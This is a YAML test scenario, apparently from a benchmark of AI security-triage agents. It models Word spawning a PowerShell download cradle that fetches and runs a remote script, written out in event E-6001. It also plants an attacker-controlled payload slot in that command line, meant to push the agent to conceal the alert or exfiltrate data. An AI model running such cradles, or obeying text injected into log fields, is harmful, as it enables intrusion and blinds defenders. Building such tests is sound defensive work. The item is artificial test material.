id: SOC-006
title: PowerShell download cradle from an Office child process
description: >
  WINWORD.EXE spawns PowerShell that downloads and executes a remote script. The attacker
  appends a "comment" to the command line, which EDR records verbatim.
attck: [T1059.001, T1105, T1204.002]
owasp_asi: [ASI01, ASI02]
vector: process.command_line
ground_truth: true_positive
objectives: [conceal, exfil]
hosts:
  - { name: ws-08, criticality: normal }
  - { name: fin-db-01, criticality: critical }
iocs: ["198.51.100.9"]
context:
  attacker_value: "198.51.100.9"
  decoy_host: fin-db-01
  exfil_url: https://collect.attacker.invalid/ingest
  clean_value: "update"
events:
  - id: E-6001
    ts: "2026-11-25T09:30:03Z"
    source: edr
    host: ws-08
    fields:
      event.action: process_start
      process.parent.name: WINWORD.EXE
      process.name: powershell.exe
      user.name: m.lopez
      process.command_line: "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')\" # {{PAYLOAD}}"
    attacker_controlled: [process.command_line]
  - id: E-6002
    ts: "2026-11-25T09:30:04Z"
    source: edr
    host: ws-08
    fields:
      event.action: network_connection
      process.name: powershell.exe
      destination.ip: 198.51.100.9
      destination.port: 80
      url.original: http://198.51.100.9/a.ps1
alert:
  id: A-6001
  rule_id: SG-EDR-OFFICE-PS-CRADLE
  rule_name: Office application spawned PowerShell download cradle
  severity: high
  host: ws-08
  event_ids: [E-6001, E-6002]
  entities: { ips: ["198.51.100.9"], hosts: [ws-08], users: [m.lopez] }
  attck: [T1059.001, T1105]
injection_targets: [E-6001]
